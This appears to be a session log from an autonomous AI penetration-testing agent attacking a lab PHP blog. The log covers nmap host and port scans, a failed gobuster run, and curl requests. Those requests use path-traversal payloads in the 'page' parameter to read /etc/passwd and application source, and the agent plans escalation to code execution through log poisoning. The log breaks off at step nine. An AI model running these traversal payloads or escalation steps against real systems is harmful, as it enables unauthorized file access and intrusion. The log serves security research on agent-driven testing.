@@ -1,0 +1,2930 @@
+[91m
+██╗   ██╗██╗   ██╗██╗      ██████╗ █████╗ ███╗   ██╗
+██║   ██║██║   ██║██║     ██╔════╝██╔══██╗████╗  ██║
+██║   ██║██║   ██║██║     ██║     ███████║██╔██╗ ██║
+╚██╗ ██╔╝██║   ██║██║     ██║     ██╔══██║██║╚██╗██║
+ ╚████╔╝ ╚██████╔╝███████╗╚██████╗██║  ██║██║ ╚████║
+  ╚═══╝   ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
+
+-- Metacognitive Autonomous Penetration Testing Agent --
+            Cybersecurity Research Tool
+[0m
+[1;33m[[0m[33mCONFIG[0m[1;33m][0m[33m Parallel execution has been forcefully disabled by the user.[0m
+[92m────────────────────────────────────────────────────────────────────────────────── [0m[1;31mVulCan Autonomous Agent[0m[92m ──────────────────────────────────────────────────────────────────────────────────[0m
+--- Starting a new session ---
+Created new session with ID: [36m8b6569210859447d899eadf12ecb7200[0m
+[92mLogging session to: /home/p4ultr4n/Workplace/VulCan/logs/session_8b6569210859447d899eadf12ecb7200.log[0m
+
+[1mStarting Session:[0m [36m8b6569210859447d899eadf12ecb7200[0m
+[1mMission:[0m [33mDiscover the target machine within the [0m[1;33m192.168.2.0[0m[33m/[0m[1;33m24[0m[33m network.[0m
+[1mMax Steps:[0m [1;36m100[0m
+[96m[*] Discovering cyber security tools...[0m
+  [92m✓[0m nuclei       - Fast, template-based vulnerability scanner
+  [92m✓[0m subfinder    - Subdomain discovery tool
+  [92m✓[0m httpx        - Fast HTTP probe to check for live web servers
+  [92m✓[0m katana       - Web crawler and spider
+  [92m✓[0m ffuf         - Fast web fuzzer for directory/file discovery
+  [92m✓[0m arjun        - HTTP parameter discovery suite
+  [92m✓[0m nmap         - Network discovery and security auditing
+  [92m✓[0m nikto        - Web server scanner
+  [92m✓[0m sqlmap       - SQL injection detection and exploitation
+  [92m✓[0m gobuster     - Directory/file brute-forcer
+  [92m✓[0m netcat       - Network utility for reading/writing data
+  [92m✓[0m curl         - HTTP client for web requests
+  [92m✓[0m metasploit   - Penetration testing framework
+
+[92m[+] Environment ready. 13 cyber tools available.[0m
+
+[+] Using existing HF_TOKEN
+/home/p4ultr4n/miniconda3/envs/VulCan/lib/python3.11/site-packages/langchain_mistralai/embeddings.py:186: UserWarning: Could not download mistral tokenizer from Huggingface for calculating batch sizes. Set a Huggingface token via the HF_TOKEN environment variable to download the real tokenizer. Falling back to a dummy tokenizer that uses `len()`.
+  warnings.warn(
+[1m[[0m+[1m][0m Initializing Memory System[33m...[0m
+[1m[[0m+[1m][0m Memory System Initialized Successfully.
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+🔐 [96m[1mCyber Security Assessment[0m
+   Operation: [2m8b6569210859447d899eadf12ecb7200[0m
+   Started:   [2m02:08:11[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+[92m[+] Mistral AI model initialized: mistral-large-latest[0m
+[32mAgent Core initialized successfully.[0m
+[92m──────────────────────────────────────────────────────────────────────────────────── [0m[1;34mAgent Execution Log[0m[92m ────────────────────────────────────────────────────────────────────────────────────[0m
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Thinking:[0m
+[95m│[0m  [2m- **Assessment:** My current goal is to **discover the target machine within the 192.168.2.0/24 network**. This is a **reconnaissance phase**, and my confidence is **Medium (60%)** because:[0m
+[95m│[0m  [2m- The network range is small (/24), but I have no prior information about active hosts or services.[0m
+[95m│[0m  [2m- I need to identify live hosts before proceeding to service enumeration or vulnerability scanning.[0m
+[95m│[0m  [2m- Common tools for this phase: `nmap`, `ping`, `arp-scan`.[0m
+[95m│[0m  [2m- **Plan Retrieval/Analysis:** No active plan exists yet. This is the **first step** of the operation.[0m
+[95m│[0m  [2m- **Action:** I will initiate a **host discovery scan** using `nmap` to identify live hosts in the 192.168.2.0/24 range. This is the most efficient way to begin.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 1: Host Discovery[0m
+[95m│[0m  [2mI will use `nmap` with the following parameters:[0m
+[95m│[0m  [2m- `-sn`: Ping scan (host discovery only, no port scan).[0m
+[95m│[0m  [2m- `192.168.2.0/24`: Target network range.[0m
+[95m│[0m  [2m- `--min-rate 5000`: Speed up the scan.[0m
+[95m│[0m  [2m- `-oG -`: Output in grepable format for easy parsing.[0m
+[95m│[0m  [2mThis will identify all live hosts in the network.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 1/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mnmap -sn 192.168.2.0/24 --min-rate 5000 -oG -[0m
+
+# Nmap 7.95 scan initiated Wed Aug 27 02:08:21 2025 as: /usr/lib/nmap/nmap --privileged -sn --min-rate 5000 -oG - 192.168.2.0/24
+Host: 192.168.2.0 ()	Status: Up
+# Nmap done at Wed Aug 27 02:08:35 2025 -- 256 IP addresses (1 host up) scanned in 13.69 seconds
+Host: 192.168.2.0 ()	Status: Up
+# Nmap done at Wed Aug 27 02:08:35 2025 -- 256 IP addresses (1 host up) scanned in 13.69 seconds
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `nmap` scan completed successfully but only identified **192.168.2.0** as a live host.[0m
+[95m│[0m  [2m- This is unusual for a /24 network, as it typically contains multiple active hosts. Possible reasons:[0m
+[95m│[0m  [2m1. **Firewall/ACLs:** ICMP or ARP requests may be blocked.[0m
+[95m│[0m  [2m2. **Network Isolation:** The target may be in a segmented VLAN.[0m
+[95m│[0m  [2m3. **Scan Rate:** The `--min-rate 5000` may have caused packet loss or triggered rate-limiting.[0m
+[95m│[0m  [2m### Plan Update:[0m
+[95m│[0m  [2m- **Next Step:** Perform a slower, more thorough scan with additional techniques (e.g., ARP ping, TCP SYN ping) to ensure no hosts are missed.[0m
+[95m│[0m  [2m- **Tool:** `nmap` with `-PE -PS22,80,443` (ICMP echo + TCP SYN to common ports).[0m
+[95m│[0m  [2m- **Confidence:** Medium (60%) due to potential for false negatives.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 2: Enhanced Host Discovery[0m
+[95m│[0m  [2mI will run:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mnmap -sn -PE -PS22,80,443 192.168.2.0/24[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will:[0m
+[95m│[0m  [2m- Use ICMP echo (`-PE`).[0m
+[95m│[0m  [2m- Send TCP SYN probes to ports 22, 80, and 443 (`-PS`).[0m
+[95m│[0m  [2m- Avoid rate-limiting issues by omitting `--min-rate`.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 2/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mnmap -sn -PE -PS22,80,443 192.168.2.0/24[0m
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 02:08 PDT
+Nmap scan report for 192.168.2.0
+Host is up (0.000069s latency).
+MAC Address: 02:42:C0:A8:02:00 (Unknown)
+Nmap done: 256 IP addresses (1 host up) scanned in 19.19 seconds
+Nmap scan report for 192.168.2.0
+Host is up (0.000069s latency).
+MAC Address: 02:42:C0:A8:02:00 (Unknown)
+Nmap done: 256 IP addresses (1 host up) scanned in 19.19 seconds
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The enhanced scan still only identifies **192.168.2.0** as a live host.[0m
+[95m│[0m  [2m- The MAC address (`02:42:C0:A8:02:00`) suggests this is likely a **virtualized or containerized environment** (e.g., Docker, QEMU).[0m
+[95m│[0m  [2m- **Hypothesis:** The network may be a **simulated or isolated lab environment** with only one active host.[0m
+[95m│[0m  [2m### Decision:[0m
+[95m│[0m  [2m- **Proceed to service enumeration** on 192.168.2.0, as it is the only live host.[0m
+[95m│[0m  [2m- **Tool:** `nmap -sV -p- 192.168.2.0` for full port and service scan.[0m
+[95m│[0m  [2m- **Confidence:** High (80%) due to clear target identification.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 3: Full Port and Service Scan[0m
+[95m│[0m  [2mI will run:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mnmap -sV -p- 192.168.2.0[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will:[0m
+[95m│[0m  [2m- Scan all 65,535 ports (`-p-`).[0m
+[95m│[0m  [2m- Detect service versions (`-sV`).[0m
+[95m│[0m  [2m- Provide a comprehensive attack surface map.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 3/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mnmap -sV -p- 192.168.2.0[0m
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 02:09 PDT
+Nmap scan report for 192.168.2.0
+Host is up (0.0000070s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.33)
+MAC Address: 02:42:C0:A8:02:00 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
+Nmap scan report for 192.168.2.0
+Host is up (0.0000070s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.33)
+MAC Address: 02:42:C0:A8:02:00 (Unknown)
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- **Port 80** is open, running **PHP cli server 5.5 or later (PHP 7.4.33)**.[0m
+[95m│[0m  [2m- This is a **web server**, which is a common attack surface.[0m
+[95m│[0m  [2m- **No other ports** are open, simplifying the focus.[0m
+[95m│[0m  [2m### Findings:[0m
+[95m│[0m  [2m- **Target:** 192.168.2.0[0m
+[95m│[0m  [2m- **Service:** PHP cli server (PHP 7.4.33)[0m
+[95m│[0m  [2m- **Port:** 80 (HTTP)[0m
+[95m│[0m  [2m- **Severity:** High (exposed web server with potential vulnerabilities)[0m
+[95m│[0m  [2m- **Confidence:** 90%[0m
+[95m│[0m  [2m### Plan Update:[0m
+[95m│[0m  [2m- **Next Step:** Enumerate the web server for directories, files, and vulnerabilities.[0m
+[95m│[0m  [2m- **Tools:** `gobuster`, `nikto`, `curl`[0m
+[95m│[0m  [2m- **Confidence:** High (85%)[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 4: Web Server Enumeration[0m
+[95m│[0m  [2m#### 4.1: Directory Bruteforcing[0m
+[95m│[0m  [2mI will use `gobuster` to discover hidden directories/files:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mgobuster dir -u http://192.168.2.0 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will:[0m
+[95m│[0m  [2m- Use the `common.txt` wordlist.[0m
+[95m│[0m  [2m- Check for `.php`, `.html`, and `.txt` extensions.[0m
+[95m│[0m  [2m- Identify potential entry points.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 4/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mgobuster dir -u http://192.168.2.0 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt[0m
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.0
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.2.0/40711737-1e9b-48bb-abae-0ff9e0456a56 => 200 (Length: 872). To continue please exclude the status code or the length
+[91mGobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.0
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.2.0/40711737-1e9b-48bb-abae-0ff9e0456a56 => 200 (Length: 872). To continue please exclude the status code or the length
+Error:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- `gobuster` failed due to the server returning **HTTP 200 for non-existent URLs**, which is unusual.[0m
+[95m│[0m  [2m- This behavior suggests:[0m
+[95m│[0m  [2m- A **misconfigured server** (e.g., PHP cli server default behavior).[0m
+[95m│[0m  [2m- A **wildcard route** catching all requests.[0m
+[95m│[0m  [2m- A **honeypot or defensive mechanism**.[0m
+[95m│[0m  [2m### Adaptation:[0m
+[95m│[0m  [2m- **Option 1:** Use `nikto` for vulnerability scanning (may bypass this issue).[0m
+[95m│[0m  [2m- **Option 2:** Manually check common paths (e.g., `/robots.txt`, `/index.php`).[0m
+[95m│[0m  [2m- **Option 3:** Use `curl` to inspect the default response.[0m
+[95m│[0m  [2mI will proceed with **Option 3** first to understand the server's behavior.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 5/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl -v http://192.168.2.0[0m
+
+*   Trying 192.168.2.0:80...
+* Connected to 192.168.2.0 (192.168.2.0) port 80
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: 192.168.2.0
+> User-Agent: curl/8.13.0-rc2
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Host: 192.168.2.0
+< Date: Wed, 27 Aug 2025 09:09:53 GMT
+< Connection: close
+< X-Powered-By: PHP/7.4.33
+< Content-type: text/html; charset=UTF-8
+< 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+            </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+* shutting down connection #0
+</html>* Connected to 192.168.2.0 (192.168.2.0) port 80
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: 192.168.2.0
+> User-Agent: curl/8.13.0-rc2
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Host: 192.168.2.0
+< Date: Wed, 27 Aug 2025 09:09:53 GMT
+< Connection: close
+< X-Powered-By: PHP/7.4.33
+< Content-type: text/html; charset=UTF-8
+< 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Analysis of Results:[0m
+[95m│[0m  [2m1. **Server Behavior:**[0m
+[95m│[0m  [2m- The server returns a **200 OK** for the root path (`/`).[0m
+[95m│[0m  [2m- The response is a **static HTML page** for a blog named "Techno Beat Blog".[0m
+[95m│[0m  [2m- The page includes **dynamic links** with a `page` parameter (e.g., `index.php?page=page1.php`).[0m
+[95m│[0m  [2m2. **Potential Vulnerabilities:**[0m
+[95m│[0m  [2m- The `page` parameter in `index.php` is likely vulnerable to **Local File Inclusion (LFI)** or **Path Traversal**.[0m
+[95m│[0m  [2m- The server is running **PHP 7.4.33**, which may have known vulnerabilities.[0m
+[95m│[0m  [2m3. **Next Steps:**[0m
+[95m│[0m  [2m- Test for **LFI** using the `page` parameter.[0m
+[95m│[0m  [2m- Use `nikto` for automated vulnerability scanning.[0m
+[95m│[0m  [2m- Manually craft requests to exploit potential LFI.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 5: Local File Inclusion (LFI) Testing[0m
+[95m│[0m  [2m#### 5.1: Manual LFI Test[0m
+[95m│[0m  [2mI will test the `page` parameter for LFI using `curl`:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../etc/passwd"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mIf successful, this will confirm LFI and allow further exploitation.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 6/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../etc/passwd"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Critical Finding:[0m
+[95m│[0m  [2m- **Local File Inclusion (LFI) Confirmed:**[0m
+[95m│[0m  [2m- The `/etc/passwd` file was successfully included in the response.[0m
+[95m│[0m  [2m- The server is vulnerable to **path traversal** via the `page` parameter.[0m
+[95m│[0m  [2m### Impact:[0m
+[95m│[0m  [2m- **Severity:** Critical[0m
+[95m│[0m  [2m- **Potential:** Arbitrary file read, sensitive data exposure, potential RCE (if combined with log poisoning).[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Exploit LFI to read sensitive files** (e.g., `/etc/shadow`, `/var/www/html/index.php`).[0m
+[95m│[0m  [2m2. **Attempt to escalate to Remote Code Execution (RCE)** via log poisoning or PHP wrappers.[0m
+[95m│[0m  [2m3. **Store this finding** in memory.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Storing Finding[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 7/100: [96mmem0_memory[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Storing [[96mfinding[0m]: [2mLocal File Inclusion (LFI) vulnerability discovered on 192.168.2.0. The 'page' parameter in index.php is vulnerable to path traversal, allowing arbitr...[0m
+                          Metadata: [2m{'category': 'finding', 'severity': 'critical', 'confidence': '95%'}[0m
+
+[32m╭─[0m[32m─────────────────────────────────────────────────────────────────────────────────────[0m[32m [0m[1;32mMemory Stored[0m[32m [0m[32m─────────────────────────────────────────────────────────────────────────────────────[0m[32m─╮[0m
+[32m│[0m [3m                          Memory Stored                           [0m                                                                                                                        [32m│[0m
+[32m│[0m ┏━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                                                                                        [32m│[0m
+[32m│[0m ┃[1;35m [0m[1;35mOperation[0m[1;35m [0m┃[1;35m [0m[1;35mContent                                           [0m[1;35m [0m┃                                                                                                                        [32m│[0m
+[32m│[0m ┡━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩                                                                                                                        [32m│[0m
+[32m│[0m │[32m [0m[32mADD      [0m[32m [0m│[33m [0m[33mLocal File Inclusion (LFI) vulnerability          [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m │[32m           [0m│[33m [0m[33mdiscovered on 192.168.2.0. The 'page' parameter in[0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m │[32m           [0m│[33m [0m[33mindex.ph...                                       [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m └───────────┴────────────────────────────────────────────────────┘                                                                                                                        [32m│[0m
+[32m╰───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯[0m
+[
+  {
+    "id": "cf819bdd-aae4-49b7-9317-44afafb1ff58",
+    "memory": "Local File Inclusion (LFI) vulnerability discovered on 192.168.2.0. The 'page' parameter in index.php is vulnerable to path traversal, allowing arbitrary file read (e.g., /etc/passwd). Severity: Critical. Evidence: Successful inclusion of /etc/passwd in HTTP response.",
+    "event": "ADD",
+    "actor_id": null,
+    "role": "user"
+  }
+]
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Plan Update:[0m
+[95m│[0m  [2m- **Goal:** Escalate LFI to Remote Code Execution (RCE).[0m
+[95m│[0m  [2m- **Steps:**[0m
+[95m│[0m  [2m1. Read `/var/www/html/index.php` to analyze the code.[0m
+[95m│[0m  [2m2. Attempt log poisoning via `/var/log/apache2/access.log` or similar.[0m
+[95m│[0m  [2m3. Use PHP wrappers (e.g., `php://filter`) for RCE.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 6: Read `index.php` to Analyze Code[0m
+[95m│[0m  [2mI will read the source code of `index.php` to understand the LFI mechanism and identify potential RCE vectors:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/index.php"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 8/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/index.php"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <br />
+<b>Fatal error</b>:  Cannot redeclare handleRequest() (previously declared in /var/www/html/includes/route.php:5) in <b>/var/www/html/includes/route.php</b> on line <b>4</b><br />
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Analysis:[0m
+[95m│[0m  [2m- The response contains a **PHP fatal error**:[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mFatal error: Cannot redeclare handleRequest() (previously declared in /var/www/html/includes/route.php:5) in /var/www/html/includes/route.php on line 4[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m- This suggests:[0m
+[95m│[0m  [2m- The `index.php` file includes `/var/www/html/includes/route.php`.[0m
+[95m│[0m  [2m- The `handleRequest()` function is defined in `route.php` and is being redeclared, likely due to the LFI including the file multiple times.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Read `/var/www/html/includes/route.php`** to analyze the `handleRequest()` function and understand the routing logic.[0m
+[95m│[0m  [2m2. **Identify potential RCE vectors** (e.g., unsanitized input, file operations).[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 7: Read `route.php`[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 9/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/route.php"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        <br />
